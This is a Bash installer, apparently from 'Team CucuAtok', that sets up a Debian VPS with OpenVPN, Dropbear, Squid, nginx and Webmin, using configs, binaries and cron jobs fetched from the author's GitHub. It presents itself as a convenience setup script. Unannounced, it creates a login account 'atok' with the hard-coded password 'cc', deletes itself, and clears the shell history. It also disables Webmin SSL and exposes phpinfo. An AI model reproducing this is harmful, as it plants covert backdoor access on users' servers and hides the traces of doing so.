#!/bin/bash
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;

if [ $USER != 'root' ]; then
	echo "Sorry, for run the script please using root user"
	exit
fi
echo "
AUTOSCRIPT BY TEAM CUCUATOK

PLEASE CANCEL ALL PACKAGE POPUP

TAKE NOTE !!!"
clear
echo "START AUTOSCRIPT"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6

COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
REMOVE SPAM PACKAGE

COMPLETE 10%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS 

PLEASE WAIT TAKE TIME 1-5 MINUTE
"
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y upgrade;
apt-get -y install wget curl;
echo "
INSTALLER PROCESS PLEASE WAIT

TAKE TIME 5-10 MINUTE
"
# script
wget -O menu https://raw.githubusercontent.com/cucuatok93/teamcck/master/menu
if [ -f menu ]; then
	mv menu /usr/local/bin/
	chmod +x /usr/local/bin/menu
fi
# fail2ban & exim & protection
apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
cd ddos-deflate-master && ./install.sh
service exim4 stop;sysv-rc-conf exim4 off;
# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
# ssh
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
# dropbear
apt-get -y install dropbear
wget -O /etc/default/dropbear "https://raw.githubusercontent.com/cucuatok93/teamcck/master/dropbear"
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
# squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/cucuatok93/teamcck/master/squid.conf"
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
# nginx
apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/cucuatok93/teamcck/master/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup by CucuAtok | telegram @cucu_atok</pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/cucuatok93/teamcck/master/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/cucuatok93/cucuatok/master/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/cucuatok93/teamcck/master/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/cucuatok93/teamcck/master/client.ovpn"
source="https://raw.githubusercontent.com/cucuatok93/cucuatok/master"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/cucuatok93/teamcck/master/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash atok
echo "atok:cc" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;

wget -O /etc/motd $source/motd

clear
# restart service
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service php5-fpm restart
service webmin restart
service squid3 restart
service fail2ban restart
clear
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript VPS (CucuAtok)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "nginx : http://$myip:80"   | tee -a log-install.txt
echo "Webmin : http://$myip:10000/"  | tee -a log-install.txt
echo "Squid3 : 8080"  | tee -a log-install.txt
echo "OpenSSH : 22"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt
echo "Menu : type menu to check menu script"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TAKE EFFECT !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
